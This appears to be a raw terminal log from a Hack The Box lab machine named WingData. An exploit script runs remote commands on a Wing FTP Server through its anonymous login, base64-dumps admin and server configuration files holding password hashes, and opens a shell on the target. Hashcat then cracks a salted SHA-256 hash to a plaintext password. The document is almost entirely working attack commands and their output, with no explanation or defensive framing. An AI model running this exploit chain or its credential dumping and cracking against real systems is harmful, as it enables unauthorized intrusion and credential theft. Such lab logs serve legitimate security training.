[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 01e2ed0957360dc57f6b82b2b015ba9cf528764d624db129b32c21fbca0cb8d6

--- Command Output ---
total 56
drwxr-x--- 5 wingftp wingftp  4096 Feb 15 11:19 .
drwxr-x--- 9 wingftp wingftp  4096 Feb 15 09:15 ..
drwxr-x--- 2 wingftp wingftp  4096 Feb 15 09:15 Admin
-rwxr-x--- 1 wingftp wingftp 26624 Feb 15 11:19 audit_db
drwxr-x--- 3 wingftp wingftp  4096 Feb  9 08:19 Domains
-rw------- 1 wingftp wingftp  1743 Feb 15 11:19 ssh_debug_log
drwxr-x--- 2 wingftp wingftp  4096 Feb 15 09:15 System
----------------------
(venv) ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "ls -la Log/Admin"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la Log/Admin' and username: 'anonymous'
[+] UID extracted: 4eb65fe93aa4f14d7a8a9141082ee9c1f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 4eb65fe93aa4f14d7a8a9141082ee9c1f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
total 44
drwxr-x--- 2 wingftp wingftp 4096 Feb 15 09:15 .
drwxr-x--- 5 wingftp wingftp 4096 Feb 15 11:19 ..
-rwxr-x--- 1 wingftp wingftp 2753 Nov  2 16:27 Admin-2025-11-2.log
-rw-rw-rw- 1 wingftp wingftp  337 Nov  3 04:22 Admin-2025-11-3.log
-rw-rw-rw- 1 wingftp wingftp  118 Jan 12 08:25 Admin-2026-1-12.log
-rw-rw-rw- 1 wingftp wingftp  118 Jan 14 05:00 Admin-2026-1-14.log
-rw-rw-rw- 1 wingftp wingftp  118 Jan 20 06:31 Admin-2026-1-20.log
-rw-rw-rw- 1 wingftp wingftp  354 Jan 22 05:16 Admin-2026-1-22.log
-rw-rw-rw- 1 wingftp wingftp  103 Jan  8 09:25 Admin-2026-1-8.log
-rw-rw-rw- 1 wingftp wingftp  115 Feb 15 09:15 Admin-2026-2-15.log
-rw-rw-rw- 1 wingftp wingftp  236 Feb  9 09:35 Admin-2026-2-9.log
----------------------

```

```
(venv) ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "ls -la Log/Admin"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la Log/Admin' and username: 'anonymous'
[+] UID extracted: 9514497d70931e98dc5f9fb92a4f92e1f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 9514497d70931e98dc5f9fb92a4f92e1f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
total 44
drwxr-x--- 2 wingftp wingftp 4096 Feb 15 09:15 .
drwxr-x--- 5 wingftp wingftp 4096 Feb 15 12:04 ..
-rwxr-x--- 1 wingftp wingftp 2753 Nov  2 16:27 Admin-2025-11-2.log
-rw-rw-rw- 1 wingftp wingftp  337 Nov  3 04:22 Admin-2025-11-3.log
-rw-rw-rw- 1 wingftp wingftp  118 Jan 12 08:25 Admin-2026-1-12.log
-rw-rw-rw- 1 wingftp wingftp  118 Jan 14 05:00 Admin-2026-1-14.log
-rw-rw-rw- 1 wingftp wingftp  118 Jan 20 06:31 Admin-2026-1-20.log
-rw-rw-rw- 1 wingftp wingftp  354 Jan 22 05:16 Admin-2026-1-22.log
-rw-rw-rw- 1 wingftp wingftp  103 Jan  8 09:25 Admin-2026-1-8.log
-rw-rw-rw- 1 wingftp wingftp  115 Feb 15 09:15 Admin-2026-2-15.log
-rw-rw-rw- 1 wingftp wingftp  236 Feb  9 09:35 Admin-2026-2-9.log
----------------------
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "base64 ./Data/_ADMINISTRATOR/admins.xml"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 ./Data/_ADMINISTRATOR/admins.xml' and username: 'anonymous'
[+] UID extracted: 194b85f5fd60bbd735b36cf7f1b7f896f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 194b85f5fd60bbd735b36cf7f1b7f896f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8QURNSU5fQUNDT1VOVFMgRGVzY3JpcHRpb249Ildpbmcg
RlRQIFNlcnZlciBBZG1pbiBBY2NvdW50cyI+CiAgICA8QURNSU4+CiAgICAgICAgPEFkbWluX05h
bWU+YWRtaW48L0FkbWluX05hbWU+CiAgICAgICAgPFBhc3N3b3JkPmE4MzM5ZjhlNDQ2NWE5YzQ3
MTU4Mzk0ZDhlZmU3Y2M0NWE1ZjM2MWFiOTgzODQ0Yzg1NjJiZWYyMTkzYmFmYmE8L1Bhc3N3b3Jk
PgogICAgICAgIDxUeXBlPjA8L1R5cGU+CiAgICAgICAgPFJlYWRvbmx5PjA8L1JlYWRvbmx5Pgog
ICAgICAgIDxJc0RvbWFpbkFkbWluPjA8L0lzRG9tYWluQWRtaW4+CiAgICAgICAgPERvbWFpbkxp
c3Q+PC9Eb21haW5MaXN0PgogICAgICAgIDxNeURpcmVjdG9yeT48L015RGlyZWN0b3J5PgogICAg
ICAgIDxFbmFibGVUd29GYWN0b3I+MDwvRW5hYmxlVHdvRmFjdG9yPgogICAgICAgIDxUd29GYWN0
b3JDb2RlPjwvVHdvRmFjdG9yQ29kZT4KICAgIDwvQURNSU4+CjwvQURNSU5fQUNDT1VOVFM+Cg==

<?xml version="1.0" ?>
<ADMIN_ACCOUNTS Description="Wing FTP Server Admin Accounts">
    <ADMIN>
        <Admin_Name>admin</Admin_Name>
        <Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
        <Type>0</Type>
        <Readonly>0</Readonly>
        <IsDomainAdmin>0</IsDomainAdmin>
        <DomainList></DomainList>
        <MyDirectory></MyDirectory>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
    </ADMIN>
</ADMIN_ACCOUNTS>
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "base64 ./Data/_ADMINISTRATOR/settings.xml"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 ./Data/_ADMINISTRATOR/settings.xml' and username: 'anonymous'
[+] UID extracted: b22ce09d7375ca8ad307161333e92636f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: b22ce09d7375ca8ad307161333e92636f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8QWRtaW5pc3RyYXRvciBEZXNjcmlwdGlvbj0iV2luZyBG
VFAgU2VydmVyIEFkbWluaXN0cmF0b3IgT3B0aW9ucyI+CiAgICA8SHR0cFBvcnQ+NTQ2NjwvSHR0
cFBvcnQ+CiAgICA8SHR0cFNlY3VyZT4wPC9IdHRwU2VjdXJlPgogICAgPEFkbWluTG9nZmlsZUVu
YWJsZT4xPC9BZG1pbkxvZ2ZpbGVFbmFibGU+CiAgICA8QWRtaW5Mb2dmaWxlRmlsZU5hbWU+QWRt
aW4tJVktJU0tJUQubG9nPC9BZG1pbkxvZ2ZpbGVGaWxlTmFtZT4KICAgIDxBZG1pbkxvZ2ZpbGVN
YXhzaXplPjA8L0FkbWluTG9nZmlsZU1heHNpemU+CiAgICA8RW5hYmxlUG9ydFVQblA+MDwvRW5h
YmxlUG9ydFVQblA+CjwvQWRtaW5pc3RyYXRvcj4K

<?xml version="1.0" ?>
<Administrator Description="Wing FTP Server Administrator Options">
    <HttpPort>5466</HttpPort>
    <HttpSecure>0</HttpSecure>
    <AdminLogfileEnable>1</AdminLogfileEnable>
    <AdminLogfileFileName>Admin-%Y-%M-%D.log</AdminLogfileFileName>
    <AdminLogfileMaxsize>0</AdminLogfileMaxsize>
    <EnablePortUPnP>0</EnablePortUPnP>
</Administrator>
```

```
	ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "base64 ./Data/settings.xml"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 ./Data/settings.xml' and username: 'anonymous'
[+] UID extracted: 1892ea8d28bc2924b3851f0b3c1a9073f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 1892ea8d28bc2924b3851f0b3c1a9073f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8V2luZ0Z0cFNlcnZlciBEZXNjcmlwdGlvbj0iV2luZyBG
VFAgU2VydmVyIEdsb2JhbCBPcHRpb25zIj4KICAgIDxTeXN0ZW1Mb2dmaWxlRW5hYmxlPjE8L1N5
c3RlbUxvZ2ZpbGVFbmFibGU+CiAgICA8U3lzdGVtTG9nZmlsZUZpbGVuYW1lPlN5c3RlbS0lWS0l
TS0lRC5sb2c8L1N5c3RlbUxvZ2ZpbGVGaWxlbmFtZT4KICAgIDxTeXN0ZW1Mb2dmaWxlTWF4c2l6
ZT4wPC9TeXN0ZW1Mb2dmaWxlTWF4c2l6ZT4KICAgIDxTeXN0ZW1Mb2dmaWxlU3lzdGVtRW5hYmxl
PjE8L1N5c3RlbUxvZ2ZpbGVTeXN0ZW1FbmFibGU+CiAgICA8U3lzdGVtTG9nc2NyZWVuU3lzdGVt
RW5hYmxlPjE8L1N5c3RlbUxvZ3NjcmVlblN5c3RlbUVuYWJsZT4KICAgIDxTeXN0ZW1Mb2dmaWxl
VGFza0VuYWJsZT4xPC9TeXN0ZW1Mb2dmaWxlVGFza0VuYWJsZT4KICAgIDxTeXN0ZW1Mb2dzY3Jl
ZW5UYXNrRW5hYmxlPjE8L1N5c3RlbUxvZ3NjcmVlblRhc2tFbmFibGU+CiAgICA8RW5hYmxlTGlz
dENhY2hlPjA8L0VuYWJsZUxpc3RDYWNoZT4KICAgIDxFbmFibGVUaHVtYm5haWw+MTwvRW5hYmxl
VGh1bWJuYWlsPgogICAgPEVuYWJsZUVkMmtMaW5rPjE8L0VuYWJsZUVkMmtMaW5rPgogICAgPE1h
eERvd25sb2FkU3BlZWQ+MDwvTWF4RG93bmxvYWRTcGVlZD4KICAgIDxNYXhVcGxvYWRTcGVlZD4w
PC9NYXhVcGxvYWRTcGVlZD4KICAgIDxFbmFibGVPbmxpbmVFZGl0PjE8L0VuYWJsZU9ubGluZUVk
aXQ+CiAgICA8TWF4VGhyZWFkUG9vbD44PC9NYXhUaHJlYWRQb29sPgogICAgPFNlcnZlclBhc3N3
b3JkPjJEMzVBOEQ0MjBBNjk3MjAzRDdDNTU0QTY3OEY4MTE5PC9TZXJ2ZXJQYXNzd29yZD4KICAg
IDxEaXNhYmxlU1NMdjM+MTwvRGlzYWJsZVNTTHYzPgogICAgPEVuYWJsZUZpcHM+MTwvRW5hYmxl
Rmlwcz4KICAgIDxFbmFibGVDaG1vZD4wPC9FbmFibGVDaG1vZD4KICAgIDxBbGxvd0ZUUFByb3RD
PjE8L0FsbG93RlRQUHJvdEM+CiAgICA8RGVmYXVsdEZpbGVQZXJtPjA2MDA8L0RlZmF1bHRGaWxl
UGVybT4KICAgIDxEZWZhdWx0Rm9sZGVyUGVybT4wNzU1PC9EZWZhdWx0Rm9sZGVyUGVybT4KICAg
IDxBdWRpdERhdGFiYXNlRmlsZW5hbWU+YXVkaXRfZGI8L0F1ZGl0RGF0YWJhc2VGaWxlbmFtZT4K
ICAgIDxBdWRpdERhdGFiYXNlRW5hYmxlPjE8L0F1ZGl0RGF0YWJhc2VFbmFibGU+CiAgICA8RW5h
YmxlU0hBMjU2PjA8L0VuYWJsZVNIQTI1Nj4KICAgIDxFbmFibGVNRk1UPjE8L0VuYWJsZU1GTVQ+
CiAgICA8RGlzYWJsZVRMU3YxPjE8L0Rpc2FibGVUTFN2MT4KICAgIDxPcGVuU1NMQ2lwaGVycz5F
Q0RIRS1FQ0RTQS1BRVMxMjgtR0NNLVNIQTI1NjpFQ0RIRS1SU0EtQUVTMTI4LUdDTS1TSEEyNTY6
RUNESEUtRUNEU0EtQUVTMjU2LUdDTS1TSEEzODQ6RUNESEUtUlNBLUFFUzI1Ni1HQ00tU0hBMzg0
OkVDREhFLUVDRFNBLUNIQUNIQTIwLVBPTFkxMzA1OkVDREhFLVJTQS1DSEFDSEEyMC1QT0xZMTMw
NTwvT3BlblNTTENpcGhlcnM+CiAgICA8U0ZUUEtleEFsZ29zPmN1cnZlMjU1MTktc2hhMjU2LGN1
cnZlMjU1MTktc2hhMjU2QGxpYnNzaC5vcmcsZWNkaC1zaGEyLW5pc3RwMjU2LGVjZGgtc2hhMi1u
aXN0cDM4NCxlY2RoLXNoYTItbmlzdHA1MjEsZGlmZmllLWhlbGxtYW4tZ3JvdXAxNi1zaGE1MTIs
ZGlmZmllLWhlbGxtYW4tZ3JvdXAxOC1zaGE1MTI8L1NGVFBLZXhBbGdvcz4KICAgIDxTRlRQRW5j
QWxnb3M+YWVzMjU2LWN0cixhZXMxOTItY3RyLGFlczEyOC1jdHI8L1NGVFBFbmNBbGdvcz4KICAg
IDxTRlRQTWFjQWxnb3M+aG1hYy1zaGEyLTI1NixobWFjLXNoYTItNTEyLGhtYWMtc2hhMi0yNTYt
ZXRtQG9wZW5zc2guY29tLGhtYWMtc2hhMi01MTItZXRtQG9wZW5zc2guY29tPC9TRlRQTWFjQWxn
b3M+CiAgICA8U1NITG9nUGF0aD5Mb2cvc3NoX2RlYnVnX2xvZzwvU1NITG9nUGF0aD4KICAgIDxT
U0hMb2dMZXZlbD4xPC9TU0hMb2dMZXZlbD4KICAgIDxEaXNhYmxlVExTdjFfMT4xPC9EaXNhYmxl
VExTdjFfMT4KICAgIDxEaXNhYmxlRUNEU0FLZXk+MDwvRGlzYWJsZUVDRFNBS2V5PgogICAgPFdl
YkxpbmtQYXRoPl9XRUJMSU5LPC9XZWJMaW5rUGF0aD4KICAgIDxVcGxvYWRMaW5rUGF0aD5fVVBM
T0FETElOSzwvVXBsb2FkTGlua1BhdGg+CiAgICA8QXV0b1JlY292ZXJ5PjE8L0F1dG9SZWNvdmVy
eT4KICAgIDxTRlRQSG9zdEtleT5zc2gtcnNhLHJzYS1zaGEyLTUxMixyc2Etc2hhMi0yNTYsZWNk
c2Etc2hhMi1uaXN0cDI1NjwvU0ZUUEhvc3RLZXk+CiAgICA8UmVzdHJpY3RTZXNzaW9uSVA+MTwv
UmVzdHJpY3RTZXNzaW9uSVA+CiAgICA8U1FMaXRlREJGb2xkZXI+RGF0YTwvU1FMaXRlREJGb2xk
ZXI+CiAgICA8T3BlblNTTE5vQ2FjaGU+MDwvT3BlblNTTE5vQ2FjaGU+CiAgICA8T3BlblNTTE5v
UmVzdW1wdGlvbj4wPC9PcGVuU1NMTm9SZXN1bXB0aW9uPgogICAgPExpc3RXaXRoUmVhbFVzZXJH
cm91cD4wPC9MaXN0V2l0aFJlYWxVc2VyR3JvdXA+CiAgICA8T3BlblNTTE5vUmVuZWdvdGlhdGlv
bj4wPC9PcGVuU1NMTm9SZW5lZ290aWF0aW9uPgo8L1dpbmdGdHBTZXJ2ZXI+Cg==

<?xml version="1.0" ?>
<WingFtpServer Description="Wing FTP Server Global Options">
    <SystemLogfileEnable>1</SystemLogfileEnable>
    <SystemLogfileFilename>System-%Y-%M-%D.log</SystemLogfileFilename>
    <SystemLogfileMaxsize>0</SystemLogfileMaxsize>
    <SystemLogfileSystemEnable>1</SystemLogfileSystemEnable>
    <SystemLogscreenSystemEnable>1</SystemLogscreenSystemEnable>
    <SystemLogfileTaskEnable>1</SystemLogfileTaskEnable>
    <SystemLogscreenTaskEnable>1</SystemLogscreenTaskEnable>
    <EnableListCache>0</EnableListCache>
    <EnableThumbnail>1</EnableThumbnail>
    <EnableEd2kLink>1</EnableEd2kLink>
    <MaxDownloadSpeed>0</MaxDownloadSpeed>
    <MaxUploadSpeed>0</MaxUploadSpeed>
    <EnableOnlineEdit>1</EnableOnlineEdit>
    <MaxThreadPool>8</MaxThreadPool>
    <ServerPassword>2D35A8D420A697203D7C554A678F8119</ServerPassword>
    <DisableSSLv3>1</DisableSSLv3>
    <EnableFips>1</EnableFips>
    <EnableChmod>0</EnableChmod>
    <AllowFTPProtC>1</AllowFTPProtC>
    <DefaultFilePerm>0600</DefaultFilePerm>
    <DefaultFolderPerm>0755</DefaultFolderPerm>
    <AuditDatabaseFilename>audit_db</AuditDatabaseFilename>
    <AuditDatabaseEnable>1</AuditDatabaseEnable>
    <EnableSHA256>0</EnableSHA256>
    <EnableMFMT>1</EnableMFMT>
    <DisableTLSv1>1</DisableTLSv1>
    <OpenSSLCiphers>ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305</OpenSSLCiphers>
    <SFTPKexAlgos>curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512</SFTPKexAlgos>
    <SFTPEncAlgos>aes256-ctr,aes192-ctr,aes128-ctr</SFTPEncAlgos>
    <SFTPMacAlgos>hmac-sha2-256,hmac-sha2-512,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com</SFTPMacAlgos>
    <SSHLogPath>Log/ssh_debug_log</SSHLogPath>
    <SSHLogLevel>1</SSHLogLevel>
    <DisableTLSv1_1>1</DisableTLSv1_1>
    <DisableECDSAKey>0</DisableECDSAKey>
    <WebLinkPath>_WEBLINK</WebLinkPath>
    <UploadLinkPath>_UPLOADLINK</UploadLinkPath>
    <AutoRecovery>1</AutoRecovery>
    <SFTPHostKey>ssh-rsa,rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256</SFTPHostKey>
    <RestrictSessionIP>1</RestrictSessionIP>
    <SQLiteDBFolder>Data</SQLiteDBFolder>
    <OpenSSLNoCache>0</OpenSSLNoCache>
    <OpenSSLNoResumption>0</OpenSSLNoResumption>
    <ListWithRealUserGroup>0</ListWithRealUserGroup>
    <OpenSSLNoRenegotiation>0</OpenSSLNoRenegotiation>
</WingFtpServer>
```

```
wingftp@wingdata:/opt/wftpserver/Data/_ADMINISTRATOR$ cat admins.xml
<?xml version="1.0" ?>
<ADMIN_ACCOUNTS Description="Wing FTP Server Admin Accounts">
    <ADMIN>
        <Admin_Name>admin</Admin_Name><Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
        <Type>0</Type>
        <Readonly>0</Readonly>
        <IsDomainAdmin>0</IsDomainAdmin>
        <DomainList></DomainList>
        <MyDirectory></MyDirectory>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
    </ADMIN>
</ADMIN_ACCOUNTS>
wingftp@wingdata:/opt/wftpserver/Data/_ADMINISTRATOR$ cat settings.xml
<?xml version="1.0" ?>
<Administrator Description="Wing FTP Server Administrator Options">
    <HttpPort>5466</HttpPort>
    <HttpSecure>0</HttpSecure>
    <AdminLogfileEnable>1</AdminLogfileEnable>
    <AdminLogfileFileName>Admin-%Y-%M-%D.log</AdminLogfileFileName>
    <AdminLogfileMaxsize>0</AdminLogfileMaxsize>
    <EnablePortUPnP>0</EnablePortUPnP>
</Administrator>
```

```
ajdev@rootbox:~/HTB/WingData$ echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca" > hash
ajdev@rootbox:~/HTB/WingData$ hashcat -m 1400 -a 6 hash /usr/share/wordlists/rockyou.txt 'WingFTP'

Approaching final keyspace - workload adjusted.

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:!#7Blushing^*Bride5WingFTP
```

